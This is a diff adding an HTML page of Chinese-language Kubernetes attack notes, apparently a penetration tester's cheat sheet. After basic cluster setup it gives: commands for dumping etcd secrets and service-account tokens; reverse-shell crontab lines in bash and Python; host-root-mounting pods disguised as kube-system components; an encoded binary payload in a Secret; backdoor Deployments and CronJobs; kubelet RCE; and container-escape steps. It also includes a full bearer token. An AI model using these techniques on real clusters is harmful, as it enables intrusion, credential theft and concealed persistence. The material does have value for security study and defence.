@@ -1,0 +1,903 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>K8s攻击面 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "k8s\u0026amp;\u4e91\u539f\u751f\u7b14\u8bb0", url: "#_top", children: [
+              {title: "title: k8s\u0026amp;\u4e91\u5b89\u5168\u7b14\u8bb0 date: 2021-10-28 10:05:26 update: 2022\u5e744\u670822\u65e5", url: "#title-k8s-date-2021-10-28-100526-update-2022422" },
+          ]},
+          {title: "\u5b89\u88c5\u0026amp;\u0026amp;\u542f\u52a8", url: "#_1", children: [
+              {title: "\u5b89\u88c5minikube", url: "#minikube" },
+              {title: "\u5b89\u88c5kubectl", url: "#kubectl" },
+          ]},
+          {title: "\u90e8\u7f72\u5e94\u7528", url: "#_2", children: [
+          ]},
+          {title: "kubectl\u7ba1\u7406", url: "#kubectl_1", children: [
+              {title: "\u96c6\u7fa4\u7ba1\u7406", url: "#_3" },
+              {title: "PODS\u7ba1\u7406", url: "#pods" },
+              {title: "services\u7ba1\u7406", url: "#services" },
+              {title: "\u56fe\u5f62\u5316\u754c\u9762", url: "#_4" },
+              {title: "\u67e5\u770b\u914d\u7f6e", url: "#_5" },
+              {title: "\u67e5\u770b\u6240\u6709\u5bb9\u5668ip", url: "#ip" },
+          ]},
+          {title: "\u5229\u7528\u70b9", url: "#_6", children: [
+              {title: "\u4e00\u4e9bAPI\u64cd\u4f5c", url: "#api" },
+              {title: "2379\u7aef\u53e3Etcd\u670d\u52a1\u5229\u7528", url: "#2379etcd" },
+              {title: "\u521b\u5efa\u65b0\u5bb9\u5668\u6302\u8f7d\u5bbf\u4e3b\u673a\u76ee\u5f55", url: "#_7" },
+              {title: "\u521b\u5efa\u4e00\u4e2a\u66f4\u9690\u853d\u529f\u80fd\u66f4\u5f3a\u7684yaml", url: "#yaml" },
+              {title: "\u901a\u8fc7ReplicaSet/DaemonSet/Deplyment\u521b\u5efa\u5e76\u7ef4\u6301\u540e\u95e8\u5bb9\u5668", url: "#replicasetdaemonsetdeplyment" },
+              {title: "cronjob\u6301\u4e45\u5316", url: "#cronjob" },
+              {title: "\u5229\u7528token", url: "#token" },
+              {title: "6443\u7aef\u53e3\u533f\u540d\u7528\u6237\u7279\u6743", url: "#6443" },
+              {title: "kubelet 10250\u672a\u6388\u6743", url: "#kubelet-10250" },
+              {title: "config\u7ba1\u7406\u51ed\u636e\u5229\u7528", url: "#config" },
+              {title: "\u5229\u7528\u6c61\u70b9\u548c\u5bb9\u5fcd\u7279\u6027\u6765\u8fdb\u884cnode\u95f4\u6a2a\u5411", url: "#node" },
+              {title: "\u5229\u7528lxcfs\u670d\u52a1\u8fdb\u884c\u9003\u9038", url: "#lxcfs" },
+              {title: "\u5229\u7528cgroup\u9003\u9038", url: "#cgroup" },
+              {title: "proc\u6302\u8f7d\u9003\u9038", url: "#proc" },
+              {title: "SYS_PTRACE\u9003\u9038", url: "#sys_ptrace" },
+              {title: "debugfs\u9003\u9038\u5229\u7528-\u6bd4\u8f83\u9ebb\u70e6\u8fd8\u672a\u6d4b\u8bd5\u8fc7", url: "#debugfs-" },
+              {title: "CVE-2020-15257", url: "#cve-2020-15257" },
+              {title: "\u5185\u6838\u6f0f\u6d1e\u9003\u9038", url: "#_11" },
+          ]},
+          {title: "\u81ea\u52a8\u5316\u5229\u7528\u5de5\u5177", url: "#_12", children: [
+              {title: "kube-hunter", url: "#kube-hunter" },
+              {title: "cdk", url: "#cdk" },
+          ]},
+          {title: "\u5176\u4ed6", url: "#_13", children: [
+              {title: "Serverless\u6e17\u900f", url: "#serverless" },
+              {title: "\u5bf9\u8c61\u5b58\u50a8\u6e17\u900f", url: "#_14" },
+              {title: "AWS Lambda\u53cd\u5f39shell", url: "#aws-lambdashell" },
+              {title: "\u654f\u611f\u7684\u7aef\u53e3", url: "#_19" },
+              {title: "Kong API\u7f51\u5173\u5f00\u6e90\u7248", url: "#kong-api" },
+              {title: "Apache APISIX", url: "#apache-apisix" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../Windows%E7%9B%B8%E5%85%B3/%21%21Windows%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
+        !!Windows安全笔记
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Docker/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Docker/" class="btn btn-xs btn-link">
+        Docker
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h2 id="k8s">k8s&amp;云原生笔记</h2>
+<hr />
+<h3 id="title-k8s-date-2021-10-28-100526-update-2022422">title: k8s&amp;云安全笔记 date: 2021-10-28 10:05:26 update: 2022年4月22日</h3>
+<h2 id="_1">安装&amp;&amp;启动</h2>
+<p>官方提供了模拟环境，但是模拟环境并不是很方便。</p>
+<h3 id="minikube">安装minikube</h3>
+<p>minikube用于启动cluster</p>
+<p>先安装docker，18.09版本以上</p>
+<pre><code class="language-text-plain">apt install docker.io
+</code></pre>
+<p>安装minikube</p>
+<pre><code class="language-text-plain">curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
+sudo install minikube-linux-amd64 /usr/local/bin/minikube
+</code></pre>
+<p>启动minikube，启动集群</p>
+<p>第一次启动k8s需要安装，指定阿里云镜像</p>
+<pre><code class="language-text-plain">minikube start --force \
+    --driver docker \
+    --registry-mirror https://\*\*\*\*\*\*\*\*.mirror.aliyuncs.com \
+    --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers
+</code></pre>
+<p>如安装卡住，先使用<code>minikube delete</code>删除旧数据</p>
+<p>如提示docker运行权限不够，可使用强制启动</p>
+<pre><code class="language-text-plain">minikube start --force --driver=docker
+</code></pre>
+<p>启动nimikube后，便会自动为系统创建一个cluster</p>
+<p>更多安装详情见https://minikube.sigs.k8s.io/docs/start/</p>
+<h3 id="kubectl">安装kubectl</h3>
+<p>kubectl用于命令行管理集群</p>
+<p>安装详情见https://kubernetes.io/zh/docs/tasks/tools/install-kubectl-linux/</p>
+<h2 id="_2">部署应用</h2>
+<p>需要注意的是，部署镜像是从nodes里面拉的，需要将nodes机器的hosts解析改一下，不然无法拉镜像</p>
+<pre><code class="language-text-plain">kubectl create deployment podname --image=xx/xx
+</code></pre>
+<h2 id="kubectl_1">kubectl管理</h2>
+<h3 id="_3">集群管理</h3>
+<p>查看集群信息</p>
+<pre><code class="language-text-plain">kubectl cluster-info
+kubectl get nodes
+kubectl version
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-09_14-08-39.jpg" /></p>
+<p>可以使用kubectl proxy命令将API代理到本地</p>
+<p>默认本地访问</p>
+<pre><code class="language-text-plain">kubectl proxy
+</code></pre>
+<p>开启其他机器访问（需要授权）</p>
+<pre><code class="language-text-plain">kubectl proxy --address=0.0.0.0  --port=8009
+</code></pre>
+<p>开启其他机器访问（未授权访问）</p>
+<pre><code class="language-text-plain">kubectl proxy --address='0.0.0.0'  --accept-hosts='^*$' --port=8009
+</code></pre>
+<h3 id="pods">PODS管理</h3>
+<pre><code class="language-text-plain">// 获得所有节点
+&gt; kubectl -s http://1.2.3.4:8080/ get nodes
+// 获得所有容器
+&gt; kubectl -s http://1.2.3.4:8080/ get pods --all-namespaces=true
+// 在 myapp 容器获得一个交互式 shell
+&gt; kubectl -s http://1.2.3.4:8080/ --namespace=default exec -it myapp bash
+</code></pre>
+<p>查看pods</p>
+<pre><code class="language-text-plain">kubectl get pods
+
+kubectl get pods -n kube-system
+</code></pre>
+<p><img alt="" src="../../images/Snipaste_2023-10-09_14-09-13.jpg" /></p>
+<p>在pods上执行命令</p>
+<p>这是直接执行</p>
+<pre><code class="language-text-plain">kubectl exec -ti podname whoami
+kubectl exec -ti podname whoami -n kube-system
+</code></pre>
+<p><img alt="" src="Snipaste_2023-10-09_14-09-37.jpg" /></p>
+<p>这是进入bash</p>
+<pre><code class="language-text-plain">kubectl exec podname bash
+</code></pre>
+<p><img alt="" src="Snipaste_2023-10-09_14-09-59.jpg" /></p>
+<h3 id="services">services管理</h3>
+<p>创建service（nodeport形式）</p>
+<pre><code class="language-text-plain">kubectl create service nodeport nginx --tcp 80
+</code></pre>
+<p>创建service（LoadBalancer形式）</p>
+<pre><code class="language-text-plain">kubectl expose deployment hello-node --type=LoadBalancer --port=8080
+</code></pre>
+<p>nodeport和LoadBalancer区别是负载</p>
+<p>查看service</p>
+<pre><code class="language-text-plain">kubectl get service
+</code></pre>
+<p><img alt="" src="Snipaste_2023-10-09_14-10-14.jpg" /></p>
+<p>查看service详情</p>
+<pre><code class="language-text-plain">kubectl describe services/nginx
+</code></pre>
+<p><img alt="" src="Snipaste_2023-10-09_14-10-28.jpg" /></p>
+<p>这样就是将service映射到了master上。</p>
+<h3 id="_4">图形化界面</h3>
+<p>http://127.0.0.1:46739/api/v1/namespaces/kubernetes-dashboard/services/http:kubernetes-dashboard:/proxy/#/workloads?namespace=default
+<img alt="" src="../../images/Snipaste_2023-10-09_14-10-43.jpg" /></p>
+<h3 id="_5">查看配置</h3>
+<pre><code class="language-text-plain">kubectl config view
+</code></pre>
+<p><img alt="" src="Snipaste_2023-10-09_14-11-16.jpg" /></p>
+<h3 id="ip">查看所有容器ip</h3>
+<p><code>docker inspect -f='{{.Name}} {{.NetworkSettings.IPAddress}} {{.HostConfig.PortBindings}}' $(docker ps -aq)</code></p>
+<h2 id="_6">利用点</h2>
+<h3 id="api">一些API操作</h3>
+<pre><code class="language-text-plain">可以直接用kubectl操作
+
+查看pods
+/api/v1/namespaces/default/pods?limit=500
+
+创建容器，跟一般的一样
+/api/v1/namespaces/default/pods
+{&quot;apiVersion&quot;:&quot;v1&quot;,&quot;kind&quot;:&quot;Pod&quot;,&quot;metadata&quot;:{&quot;annotations&quot;:{&quot;kubectl.kubernetes.io/last-applied-configuration&quot;:&quot;{\&quot;apiVersion\&quot;:\&quot;v1\&quot;,\&quot;kind\&quot;:\&quot;Pod\&quot;,\&quot;metadata\&quot;:{\&quot;annotations\&quot;:{},\&quot;name\&quot;:\&quot;test-4444\&quot;,\&quot;namespace\&quot;:\&quot;default\&quot;},\&quot;spec\&quot;:{\&quot;containers\&quot;:[{\&quot;image\&quot;:\&quot;nginx:1.14.2\&quot;,\&quot;name\&quot;:\&quot;test-4444\&quot;,\&quot;volumeMounts\&quot;:[{\&quot;mountPath\&quot;:\&quot;/host\&quot;,\&quot;name\&quot;:\&quot;host\&quot;}]}],\&quot;volumes\&quot;:[{\&quot;hostPath\&quot;:{\&quot;path\&quot;:\&quot;/\&quot;,\&quot;type\&quot;:\&quot;Directory\&quot;},\&quot;name\&quot;:\&quot;host\&quot;}]}}\n&quot;},&quot;name&quot;:&quot;test-4444&quot;,&quot;namespace&quot;:&quot;default&quot;},&quot;spec&quot;:{&quot;containers&quot;:[{&quot;image&quot;:&quot;nginx:1.14.2&quot;,&quot;name&quot;:&quot;test-4444&quot;,&quot;volumeMounts&quot;:[{&quot;mountPath&quot;:&quot;/host&quot;,&quot;name&quot;:&quot;host&quot;}]}],&quot;volumes&quot;:[{&quot;hostPath&quot;:{&quot;path&quot;:&quot;/&quot;,&quot;type&quot;:&quot;Directory&quot;},&quot;name&quot;:&quot;host&quot;}]}}
+
+执行命令，遇到400时使用wscat
+wscat -n -c '/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&amp;stderr=1&amp;tty=true&amp;command=whoami'
+</code></pre>
+<h3 id="2379etcd">2379端口Etcd服务利用</h3>
+<p>etcd是一个高可用的分布式键值(key-value)数据库,存储了集群状态、服务令牌等机等密服务配置等信息。</p>
+<p>在默认情况下，访问端口可以获取到键值，其中可能包含敏感信息。</p>
+<p>看到端口可以用etcdctl去连一下，如果是未授权访问那么就可以打下集群了。</p>
+<pre><code class="language-text-plain">列出节点信息
+/v2/keys
+
+列出集群中成员信息
+/v2/members
+
+列出所有值
+/v2/keys/?recursive=true
+</code></pre>
+<p>v3版本的Etcd需要用etcdctl来操作</p>
+<p>下载https://github.com/etcd-io/etcd/releases</p>
+<pre><code class="language-text-plain">设置v3版本api，k8s用的v3
+export ETCDCTL_API=3
+本地
+本地无需认证
+查看连接状态，远程加 --endpoint参数
+etcdctl endpoint health 
+读取k8s secret
+etcdctl get / --prefix --keys-only | grep /secrets/
+读取AK
+etcdctl get /registry/secrets/default/acr-credential-518dfd1883737c2a6bde99ed6fee583c
+
+
+
+远程的情况
+设置证书，等于认证，某些情况下可以搭配任意文件下载使用
+export ETCDCTL_CERT=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/peer.crt
+export ETCDCTL_CACERT=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/ca.crt
+export ETCDCTL_KEY=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/peer.key
+etcdctl --insecure-skip-tls-verify --insecure-transport=true --endpoints=https://172.16.0.112:2379 --cacert=ca.pem --key=etcd-client-key.pem --cert=etcd-client.pem endpoint health
+
+读取token
+./etcdctl --endpoints=https://192.168.253.162:2379 get / --prefix --keys-only | grep /secrets/kube-system/clusterrole
+./etcdctl --endpoints=https://192.168.253.162:2379 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-krf7l
+</code></pre>
+<p><img alt="" src="Snipaste_2023-10-09_14-11-38.jpg" /></p>
+<h3 id="_7">创建新容器挂载宿主机目录</h3>
+<p>新建一个yaml</p>
+<pre><code class="language-text-plain">apiVersion: v1
+kind: Pod
+metadata:
+    name: myapp
+spec:
+  containers:
+  - image: k8s.gcr.io/kube-proxy:v1.22.3
+    name: test-container
+    volumeMounts:
+    - mountPath: /mnt
+      name: test-volume
+  volumes:
+  - name: test-volume
+    hostPath:
+      path: /
+</code></pre>
+<pre><code class="language-text-plain">// 由 myapp.yaml 创建容器
+&gt; kubectl -s http://1.2.3.4:8080/ create -f myapp.yaml
+
+// 等待容器创建完成
+// 获得 myapp 的交互式 shell
+&gt; kubectl -s http://1.2.3.4:8080/ --namespace=default exec -it myapp bash
+
+// 向 crontab 写入反弹 shell 的定时任务
+&gt; echo -e &quot;* * * * * root bash -i &gt;&amp; /dev/tcp/127.0.0.1/8888 0&gt;&amp;1\n&quot; &gt;&gt; /mnt/etc/crontab
+
+// 也可以用 python 反弹 shell
+&gt; echo -e &quot;* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);'\n&quot; &gt;&gt; /mnt/etc/crontab
+</code></pre>
+<h3 id="yaml">创建一个更隐蔽功能更强的yaml</h3>
+<p>以一个基础的为例</p>
+<p>查看proxy的image</p>
+<p>​ <code>kubectl -n kube-system get daemonsets kube-proxy -o yaml | grep " image:" | awk '{print $2}'</code></p>
+<p>查看所有的image</p>
+<p><code>get pods --all-namespaces -o jsonpath="{..image}" |\ tr -s '[[:space:]]' '\n' |\ sort |\ uniq -c</code></p>
+<pre><code class="language-text-plain">apiVersion: v1
+kind: Pod
+metadata:
+  name: kube-proxy-s7dhs1              #修改为更复杂的名字更加隐蔽
+  namespace: kube-system  #设置为system的pod更加隐蔽
+spec:
+  tolerations:
+  - key: ab
+    operator: Exists
+    effect: NoSchedule
+  containers:
+  - image: k8s.gcr.io/kube-proxy:v1.22.3    #使用默认image不依赖外部image
+    imagePullPolicy: IfNotPresent
+    name: test-container
+    command: [&quot;/bin/sleep&quot;, &quot;3650d&quot;]   #创建时执行命令，可以执行任何命令
+  # command: [&quot;echo $payload&quot;]   #调用环境变量
+    volumeMounts:
+    - mountPath: /mnt
+      name: test-volume
+  # env:                #调用Secret作为pod环境变量
+  # - name: payload        #环境变量名称
+  #   valueFrom:
+  #     secretKeyRef:
+  #       name: secname    #secret的name
+  #          key: data        #secret的dataname
+  volumes:
+  - name: test-volume
+    hostPath:
+      path: /
+</code></pre>
+<h4 id="_8">无文件部署</h4>
+<p>kubectl支持管道结合使用，在无文件的情况下部署pod，xx填入yaml内容</p>
+<p><code>cat &lt;&lt; EOF | kubectl apply -f -</code></p>
+<p><code>xxxxx</code></p>
+<p><code>EOF</code></p>
+<h4 id="_9">传入较多数据时</h4>
+<p>先建一个Secret，可以支持多数据。Secret引用时会自动base64解码，所以传入base64的编码数据</p>
+<pre><code class="language-text-plain">#Secret.yaml
+
+apiVersion: v1
+kind: Secret
+metadata:
+  name: secname
+  namespace: kube-system    #设置为kube-system增强隐蔽性
+type: Opaque    #类型为这个
+data:
+  data: XHg3Rlx4NDVceDRDXHg0Nlx4MDFceDAxXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwXHgwM1x4MDBceDAxXHgwMFx4MDBceDAwXHg1NFx4ODBceDA0XHgwOFx4MzRceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MzRceDAwXHgyMFx4MDBceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4ODBceDA0XHgwOFx4MDBceDgwXHgwNFx4MDhceENGXHgwMFx4MDBceDAwXHg0QVx4MDFceDAwXHgwMFx4MDdceDAwXHgwMFx4MDBceDAwXHgxMFx4MDBceDAwXHg2QVx4MEFceDVFXHgzMVx4REJceEY3XHhFM1x4NTNceDQzXHg1M1x4NkFceDAyXHhCMFx4NjZceDg5XHhFMVx4Q0RceDgwXHg5N1x4NUJceDY4XHhDMFx4QThceDEzXHhGM1x4NjhceDAyXHgwMFx4MTFceDVDXHg4OVx4RTFceDZBXHg2Nlx4NThceDUwXHg1MVx4NTdceDg5XHhFMVx4NDNceENEXHg4MFx4ODVceEMwXHg3OVx4MTlceDRFXHg3NFx4M0RceDY4XHhBMlx4MDBceDAwXHgwMFx4NThceDZBXHgwMFx4NkFceDA1XHg4OVx4RTNceDMxXHhDOVx4Q0RceDgwXHg4NVx4QzBceDc5XHhCRFx4RUJceDI3XHhCMlx4MDdceEI5XHgwMFx4MTBceDAwXHgwMFx4ODlceEUzXHhDMVx4RUJceDBDXHhDMVx4RTNceDBDXHhCMFx4N0RceENEXHg4MFx4ODVceEMwXHg3OFx4MTBceDVCXHg4OVx4RTFceDk5XHhCMlx4NkFceEIwXHgwM1x4Q0RceDgwXHg4NVx4QzBceDc4XHgwMlx4RkZceEUxXHhCOFx4MDFceDAwXHgwMFx4MDBceEJCXHgwMVx4MDBceDAwXHgwMFx4Q0RceDgw
+</code></pre>
+<p>通过环境变量调用</p>
+<p><img alt="" src="Snipaste_2023-10-09_14-12-05.jpg" /></p>
+<h3 id="replicasetdaemonsetdeplyment">通过ReplicaSet/DaemonSet/Deplyment创建并维持后门容器</h3>
+<p>在实战中要考虑到k8s的可用性，所以最好不要对关键容器做操作。</p>
+<pre><code class="language-text-plain">a.yaml
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-deployment
+  labels:
+    app: nginx-test
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:
+      containers:
+      - image: nginx
+        name: container
+        volumeMounts:
+        - mountPath: /mnt
+          name: test-volume
+      volumes:
+      - name: test-volume
+        hostPath:
+          path: /
+</code></pre>
+<p><code>kubectl apply -f nginx-deploy.yaml</code></p>
+<p><code>kubectl get pods</code></p>
+<h3 id="cronjob">cronjob持久化</h3>
+<p>创建一个CronJob定时执行任务的容器</p>
+<pre><code class="language-text-plain">a.yaml
+
+apiVersion: batch/v1beta1
+kind: CronJob
+metadata:
+  name: echotest
+spec:
+  schedule: &quot;*/1 * * * *&quot;
+  jobTemplate:
+    spec:
+      template:
+        spec:
+          containers:
+          - name: container
+            image: nginx
+            args:
+            - /bin/sh
+            - -c
+            - echo test
+          restartPolicy: OnFailure
+</code></pre>
+<pre><code class="language-text-plain">kubectl create -f cronjob.yaml
+</code></pre>
+<p>默认namespaces是default</p>
+<h3 id="token">利用token</h3>
+<h4 id="rbac">未开启RBAC的情况</h4>
+<p>版本低于1.16的k8s是未开启RBAC的，这时如果拿下了其中一个pod可以获取token，从而获取整个集群权限。</p>
+<p>路径一般位于</p>
+<p><code>/run/secrets/kubernetes.io/serviceaccount/token</code></p>
+<h4 id="_10">利用</h4>
+<p>找到token后下一步是需要找到node的ip，查看当前环境变量可以找到ip。</p>
+<p>查看token</p>
+<pre><code class="language-text-plain">kubectl get secrets
+
+kubectl describe secrets default-token-ngptv
+</code></pre>
+<p><img alt="" src="Snipaste_2023-10-09_14-12-22.jpg" /></p>
+<pre><code class="language-text-plain">利用Token与API SERVER通信，curl或kubectl
+curl -ks -H &quot;Authorization: Bearer &lt;TOKEN&gt;&quot;  https://master:6443/api/v1/namespaces/default/secrets
+
+kubectl --insecure-skip-tls-verify -s https://192.168.49.2:8443/ --token=&quot;eyJhbGciOiJSUzI1NiIsImtpZCI6ImdHUmNpR3dQZlJvQzdsbFJ4THJhVElwSkRNNms4MmFSakt5U2ZuQmppZTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc5MTExNzk0LCJpYXQiOjE2NDc1NzU3OTQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoia3ViZS1wcm94eS1zN2RoczEiLCJ1aWQiOiI2M2I4NTBjMy05ZGVlLTQ0NjctYmY2OS1mNDczYTQ1OTE3MWEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiI3Y2U4NDcwNi1hMzkwLTRlMTMtYjdjYy02ZDkwZGUxNjY0ZjIifSwid2FybmFmdGVyIjoxNjQ3NTc5NDAxfSwibmJmIjoxNjQ3NTc1Nzk0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVmYXVsdCJ9.La4cosGWedwVEF4QRibbvCtga0NiDNSJdpKqclAkVmoZI0zCz0dk295vRmrKaxMg_LLMO9gunqECdcKKRzGMF8kgelZC_DLrrePF2YdhIr2BCWtJQpdfZ62hx4nVydTHZZSr8zA-HMJOQY-5sfzXCbjrKHUyA4IvRNTE9oFZbTmwaa7xY9ZIOMfKhCh7laQBrKutUtZaRXGAuoRxaI4iVVFJc-oPKuQ_dzuKnZUIJMdcYR7mz8vuKt7hCal2H8nXjBO3Rakhy45tH6PBMULdrXjZswZuELKYfkYEgxgrVRM5YHXdIJFrb1ba1dkJM6ZmtfwUOnH_nT-dckJ1_pG7Iw&quot; -n kube-system get pods
+</code></pre>
+<p>请求头中的TOKEN必须是base64格式</p>
+<p>Service Account 可能的Tokens默认位置 /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt</p>
+<h3 id="6443">6443端口匿名用户特权</h3>
+<p>https的，默认是需要授权的，如果被错误配置了匿名用户有管理权限的话可以利用。</p>
+<p>利用方式参考8080端口的API操作</p>
+<h3 id="kubelet-10250">kubelet 10250未授权</h3>
+<p>主要是10250端口的未授权的攻击kubelet https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/</p>
+<p>kubelet未授权RCE漏洞利用工具https://github.com/serain/kubelet-anon-rce ，执行命令：</p>
+<p>python3 kubelet-anon-rce.py --node 10.1.2.3 --namespace kube-system --pod tiller-797d1b1234-gb6qt --container tiller --exec "whoami"</p>
+<p>本地测试的时候，10250 API是不允许匿名访问的</p>
+<pre><code class="language-text-plain">/pods
+curl -k /run/{namespace}/{podName}/{appName} -d &quot;cmd=whoami&quot;
+</code></pre>
+<h3 id="config">config管理凭据利用</h3>
+<p>Kubectl 默认的管理凭据，cat $HOME/.kube/config</p>
+<p>使用kubectl管理其他集群，使用指定的config文件，命令：kubectl --kubeconfig kube-192.168.18.35.config get pods -n kube-system</p>
+<h3 id="node">利用污点和容忍特性来进行node间横向</h3>
+<p>k8s在默认情况下，新的pod会被随机分配到node。可以给node设置污点（Taints）以便让某node不运行pod，这里可以简单理解为防火墙中的deny all。同时，可以给pod设置容忍（tolerations）以便让该pod可以被调用，相当于开了一个acl。</p>
+<p>当node设置了Taints后，新的pod将不能运行在一些node上，这样就限制了横向。我们可以利用这个特性来正常进行横向。</p>
+<p>污点（Taints）的三个属性:</p>
+<pre><code class="language-text-plain">NoSchedule ：表示 k8s 将不会将 Pod 调度到具有该污点的 Node 上
+PreferNoSchedule ：表示 k8s 将尽量避免将 Pod 调度到具有该污点的Node上
+NoExecute ：表示 k8s 将不会将 Pod 调度到具有该污点的 Node 上，同时会将 Node 上已经存在的 Pod 驱逐出去
+</code></pre>
+<p>可以使用<code>kubectl describe node nodename</code>来查看node的Taints属性和值</p>
+<pre><code class="language-text-plain">└─# kubectl describe node minikube
+Name:               minikube
+Roles:              control-plane,master
+Labels:             beta.kubernetes.io/arch=amd64
+                    beta.kubernetes.io/os=linux
+                    kubernetes.io/arch=amd64
+                    kubernetes.io/hostname=minikube
+                    kubernetes.io/os=linux
+                    minikube.k8s.io/commit=76b94fb3c4e8ac5062daf70d60cf03ddcc0a741b
+                    minikube.k8s.io/name=minikube
+                    minikube.k8s.io/updated_at=2022_03_17T02_25_37_0700
+                    minikube.k8s.io/version=v1.24.0
+                    node-role.kubernetes.io/control-plane=
+                    node-role.kubernetes.io/master=
+                    node.kubernetes.io/exclude-from-external-load-balancers=
+Annotations:        kubeadm.alpha.kubernetes.io/cri-socket: /var/run/dockershim.sock
+                    node.alpha.kubernetes.io/ttl: 0
+                    volumes.kubernetes.io/controller-managed-attach-detach: true
+CreationTimestamp:  Thu, 17 Mar 2022 02:25:33 -0400
+Taints:             ab=ab:NoSchedule
+..................
+</code></pre>
+<p>Taints中<code>:</code>左边的是key和值，右边的是effect。key可以为空，为空时代表可以接收所有的key。</p>
+<p>给pod配置文件设置一个tolerations值，这个值需要与node的Taints一样，表示这个pod可以接受node的污点。</p>
+<pre><code class="language-text-plain">apiVersion: v1
+kind: Pod
+metadata:
+  name: myapp
+spec:
+  tolerations:
+  - key: ab
+    operator: Exists
+    effect: NoSchedule
+  containers:
+  - image: nginx
+    name: test-container
+    command: [&quot;/bin/sleep&quot;, &quot;3650d&quot;]
+    volumeMounts:
+    - mountPath: /mnt
+      name: test-volume
+  volumes:
+  - name: test-volume
+    hostPath:
+      path: /
+</code></pre>
+<p>尝试多次创建pod，pod被分配到其他node上时便可以横向了。</p>
+<h3 id="lxcfs">利用lxcfs服务进行逃逸</h3>
+<p>查看是否安装了服务</p>
+<pre><code class="language-text-plain">cat /proc/1/mountinfo
+</code></pre>
+<p>修改lxcfs访问权限</p>
+<pre><code class="language-text-plain">echo a &gt; devices.allow
+</code></pre>
+<p>获取主设备号ID</p>
+<pre><code class="language-text-plain">cat /proc/self/mountinfo | grep etc
+
+3567 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/resolv.conf /mnt/etc/resolv.conf rw,relatime master:238 - ext4 /dev/sda1 rw,errors=remount-ro
+3568 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/hostname /mnt/etc/hostname rw,relatime master:239 - ext4 /dev/sda1 rw,errors=remount-ro
